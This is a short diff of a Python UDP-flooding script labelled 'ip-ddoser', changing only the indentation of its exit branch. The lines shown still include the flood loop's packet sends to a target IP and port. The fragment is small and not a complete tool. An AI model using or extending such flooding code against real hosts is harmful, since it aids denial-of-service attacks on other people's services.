@@ -46,5 +46,5 @@ while True:
 		print ("\033[1;31m[*] %s -> %s:%s (ip-ddoser by marcinho3bola)" %(sent, ip, port))
 		sent = sent + 1
 	except KeyboardInterrupt:
-    	sock.sendto(bytes, (ip, port))
-    	print("\033[1;36mVocê escolheu sair.")
+		sock.sendto(bytes, (ip, port))
+		print("\033[1;36mVocê escolheu sair.")
